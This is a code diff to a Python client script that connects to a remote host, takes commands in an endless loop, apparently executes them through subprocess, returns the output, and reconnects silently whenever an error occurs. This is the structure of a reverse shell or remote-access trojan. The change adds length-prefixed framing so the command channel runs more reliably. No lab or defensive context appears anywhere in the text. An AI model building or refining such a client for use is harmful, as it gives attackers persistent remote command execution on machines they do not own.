@@ -3,7 +3,7 @@ import subprocess
 import os
 import shutil
 import sys
-
+import struct
 
 class Client:
     def __init__(self, host, port):
@@ -37,11 +37,21 @@ class Client:
         self.client.send(data)
 
     def receive(self):
-        return self.client.recv(6000)
-
+        raw_length = self.client.recv(4)
+        if not raw_length:
+            return None
+        length = struct.unpack("!I", raw_length)[0]
+        return self._receiveAll(length)
+    
+    def _receiveAll(self, n):
+        data = b""
+        while len(data) < n:
+            part = self.client.recv(n - len(data))
+            if not part: return None
+            data += part
+        return data
 
 client = None
-
 
 def connect():
     global client
@@ -51,13 +61,11 @@ def connect():
         except Exception:
             pass
 
-
 connect()
 
 while True:
     try:
-
-        command = client.receive().decode()
+        command = client.receive().decode("utf-8")
 
         if command is None:
             continue
@@ -73,7 +81,7 @@ while True:
         if output is None or output == "":
             output = "Command executed successfully"
 
-        client.send(output.encode())
-    except Exception:
+        client.send(output.encode("utf-8"))
+    except Exception as e:
         client = None
         connect()
